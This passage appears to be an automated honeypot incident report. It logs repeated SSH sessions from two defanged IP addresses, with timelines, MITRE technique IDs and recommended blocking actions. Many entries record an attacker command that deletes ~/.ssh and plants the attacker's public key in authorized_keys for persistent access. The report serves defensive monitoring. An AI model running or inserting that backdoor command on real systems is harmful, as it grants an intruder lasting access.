| `2026-04-13 14:44:39` | `cowrie.client.kex` |
| `2026-04-13 14:44:39` | `cowrie.login.success` |
| `2026-04-13 14:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da4822b70ad

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:45 |
| **Last Seen** | 2026-04-13 14:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:45:35` | `cowrie.session.connect` |
| `2026-04-13 14:45:35` | `cowrie.client.version` |
| `2026-04-13 14:45:35` | `cowrie.client.kex` |
| `2026-04-13 14:45:36` | `cowrie.login.success` |
| `2026-04-13 14:45:36` | `cowrie.session.params` |
| `2026-04-13 14:45:36` | `cowrie.command.input` |
| `2026-04-13 14:45:36` | `cowrie.command.failed` |
| `2026-04-13 14:45:36` | `cowrie.log.closed` |
| `2026-04-13 14:45:36` | `cowrie.session.params` |
| `2026-04-13 14:45:36` | `cowrie.command.input` |
| `2026-04-13 14:45:37` | `cowrie.session.file_download` |
| `2026-04-13 14:45:37` | `cowrie.log.closed` |
| `2026-04-13 14:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a4e364fa986

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:45 |
| **Last Seen** | 2026-04-13 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:45:39` | `cowrie.session.connect` |
| `2026-04-13 14:45:39` | `cowrie.client.version` |
| `2026-04-13 14:45:39` | `cowrie.client.kex` |
| `2026-04-13 14:45:39` | `cowrie.login.success` |
| `2026-04-13 14:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df0f40311af

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:46 |
| **Last Seen** | 2026-04-13 14:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:46:59` | `cowrie.session.connect` |
| `2026-04-13 14:46:59` | `cowrie.client.version` |
| `2026-04-13 14:46:59` | `cowrie.client.kex` |
| `2026-04-13 14:47:00` | `cowrie.login.success` |
| `2026-04-13 14:47:00` | `cowrie.session.params` |
| `2026-04-13 14:47:00` | `cowrie.command.input` |
| `2026-04-13 14:47:00` | `cowrie.command.failed` |
| `2026-04-13 14:47:00` | `cowrie.log.closed` |
| `2026-04-13 14:47:01` | `cowrie.session.params` |
| `2026-04-13 14:47:01` | `cowrie.command.input` |
| `2026-04-13 14:47:01` | `cowrie.session.file_download` |
| `2026-04-13 14:47:01` | `cowrie.log.closed` |
| `2026-04-13 14:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e629557c43e5

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:47 |
| **Last Seen** | 2026-04-13 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:47:03` | `cowrie.session.connect` |
| `2026-04-13 14:47:03` | `cowrie.client.version` |
| `2026-04-13 14:47:03` | `cowrie.client.kex` |
| `2026-04-13 14:47:04` | `cowrie.login.success` |
| `2026-04-13 14:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24e3d3a2453

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:51 |
| **Last Seen** | 2026-04-13 14:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:51:13` | `cowrie.session.connect` |
| `2026-04-13 14:51:13` | `cowrie.client.version` |
| `2026-04-13 14:51:13` | `cowrie.client.kex` |
| `2026-04-13 14:51:13` | `cowrie.login.success` |
| `2026-04-13 14:51:14` | `cowrie.session.params` |
| `2026-04-13 14:51:14` | `cowrie.command.input` |
| `2026-04-13 14:51:14` | `cowrie.command.failed` |
| `2026-04-13 14:51:14` | `cowrie.log.closed` |
| `2026-04-13 14:51:14` | `cowrie.session.params` |
| `2026-04-13 14:51:14` | `cowrie.command.input` |
| `2026-04-13 14:51:14` | `cowrie.session.file_download` |
| `2026-04-13 14:51:14` | `cowrie.log.closed` |
| `2026-04-13 14:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b9fd80dab0

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:51 |
| **Last Seen** | 2026-04-13 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:51:17` | `cowrie.session.connect` |
| `2026-04-13 14:51:17` | `cowrie.client.version` |
| `2026-04-13 14:51:17` | `cowrie.client.kex` |
| `2026-04-13 14:51:17` | `cowrie.login.success` |
| `2026-04-13 14:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ceeb912a3ef

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:52 |
| **Last Seen** | 2026-04-13 14:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:52:52` | `cowrie.session.connect` |
| `2026-04-13 14:52:52` | `cowrie.client.version` |
| `2026-04-13 14:52:53` | `cowrie.client.kex` |
| `2026-04-13 14:52:53` | `cowrie.login.success` |
| `2026-04-13 14:52:53` | `cowrie.session.params` |
| `2026-04-13 14:52:53` | `cowrie.command.input` |
| `2026-04-13 14:52:53` | `cowrie.command.failed` |
| `2026-04-13 14:52:54` | `cowrie.log.closed` |
| `2026-04-13 14:52:54` | `cowrie.session.params` |
| `2026-04-13 14:52:54` | `cowrie.command.input` |
| `2026-04-13 14:52:54` | `cowrie.session.file_download` |
| `2026-04-13 14:52:54` | `cowrie.log.closed` |
| `2026-04-13 14:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d70c4a155280

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:52 |
| **Last Seen** | 2026-04-13 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:52:56` | `cowrie.session.connect` |
| `2026-04-13 14:52:56` | `cowrie.client.version` |
| `2026-04-13 14:52:56` | `cowrie.client.kex` |
| `2026-04-13 14:52:57` | `cowrie.login.success` |
| `2026-04-13 14:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b719d49a7a24

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:52 |
| **Last Seen** | 2026-04-13 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:52:57` | `cowrie.session.connect` |
| `2026-04-13 14:52:57` | `cowrie.client.version` |
| `2026-04-13 14:52:57` | `cowrie.client.kex` |
| `2026-04-13 14:52:58` | `cowrie.login.success` |
| `2026-04-13 14:52:58` | `cowrie.session.params` |
| `2026-04-13 14:52:58` | `cowrie.command.input` |
| `2026-04-13 14:52:58` | `cowrie.command.failed` |
| `2026-04-13 14:52:58` | `cowrie.log.closed` |
| `2026-04-13 14:52:58` | `cowrie.session.params` |
| `2026-04-13 14:52:58` | `cowrie.command.input` |
| `2026-04-13 14:52:59` | `cowrie.session.file_download` |
| `2026-04-13 14:52:59` | `cowrie.log.closed` |
| `2026-04-13 14:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ddcd9492336

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:53 |
| **Last Seen** | 2026-04-13 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:53:01` | `cowrie.session.connect` |
| `2026-04-13 14:53:01` | `cowrie.client.version` |
| `2026-04-13 14:53:01` | `cowrie.client.kex` |
| `2026-04-13 14:53:01` | `cowrie.login.success` |
| `2026-04-13 14:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2cf1e9fb19

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:54 |
| **Last Seen** | 2026-04-13 14:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:54:21` | `cowrie.session.connect` |
| `2026-04-13 14:54:21` | `cowrie.client.version` |
| `2026-04-13 14:54:21` | `cowrie.client.kex` |
| `2026-04-13 14:54:21` | `cowrie.login.success` |
| `2026-04-13 14:54:22` | `cowrie.session.params` |
| `2026-04-13 14:54:22` | `cowrie.command.input` |
| `2026-04-13 14:54:22` | `cowrie.command.failed` |
| `2026-04-13 14:54:22` | `cowrie.log.closed` |
| `2026-04-13 14:54:22` | `cowrie.session.params` |
| `2026-04-13 14:54:22` | `cowrie.command.input` |
| `2026-04-13 14:54:22` | `cowrie.session.file_download` |
| `2026-04-13 14:54:22` | `cowrie.log.closed` |
| `2026-04-13 14:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22ea2c55cd8

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:54 |
| **Last Seen** | 2026-04-13 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:54:24` | `cowrie.session.connect` |
| `2026-04-13 14:54:24` | `cowrie.client.version` |
| `2026-04-13 14:54:25` | `cowrie.client.kex` |
| `2026-04-13 14:54:25` | `cowrie.login.success` |
| `2026-04-13 14:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11689463e378

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:54 |
| **Last Seen** | 2026-04-13 14:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:54:36` | `cowrie.session.connect` |
| `2026-04-13 14:54:36` | `cowrie.client.version` |
| `2026-04-13 14:54:36` | `cowrie.client.kex` |
| `2026-04-13 14:54:37` | `cowrie.login.success` |
| `2026-04-13 14:54:37` | `cowrie.session.params` |
| `2026-04-13 14:54:37` | `cowrie.command.input` |
| `2026-04-13 14:54:37` | `cowrie.command.failed` |
| `2026-04-13 14:54:37` | `cowrie.log.closed` |
| `2026-04-13 14:54:38` | `cowrie.session.params` |
| `2026-04-13 14:54:38` | `cowrie.command.input` |
| `2026-04-13 14:54:38` | `cowrie.session.file_download` |
| `2026-04-13 14:54:38` | `cowrie.log.closed` |
| `2026-04-13 14:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9f5e1dd0778

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:54 |
| **Last Seen** | 2026-04-13 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:54:40` | `cowrie.session.connect` |
| `2026-04-13 14:54:40` | `cowrie.client.version` |
| `2026-04-13 14:54:40` | `cowrie.client.kex` |
| `2026-04-13 14:54:41` | `cowrie.login.success` |
| `2026-04-13 14:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cb7296fc0e9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:56 |
| **Last Seen** | 2026-04-13 14:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:56:19` | `cowrie.session.connect` |
| `2026-04-13 14:56:19` | `cowrie.client.version` |
| `2026-04-13 14:56:19` | `cowrie.client.kex` |
| `2026-04-13 14:56:20` | `cowrie.login.success` |
| `2026-04-13 14:56:20` | `cowrie.session.params` |
| `2026-04-13 14:56:20` | `cowrie.command.input` |
| `2026-04-13 14:56:20` | `cowrie.command.failed` |
| `2026-04-13 14:56:20` | `cowrie.log.closed` |
| `2026-04-13 14:56:20` | `cowrie.session.params` |
| `2026-04-13 14:56:20` | `cowrie.command.input` |
| `2026-04-13 14:56:21` | `cowrie.session.file_download` |
| `2026-04-13 14:56:21` | `cowrie.log.closed` |
| `2026-04-13 14:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6243b81304a

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:56 |
| **Last Seen** | 2026-04-13 14:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:56:23` | `cowrie.session.connect` |
| `2026-04-13 14:56:23` | `cowrie.client.version` |
| `2026-04-13 14:56:23` | `cowrie.client.kex` |
| `2026-04-13 14:56:23` | `cowrie.login.success` |
| `2026-04-13 14:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313dffd69c68

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:57 |
| **Last Seen** | 2026-04-13 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
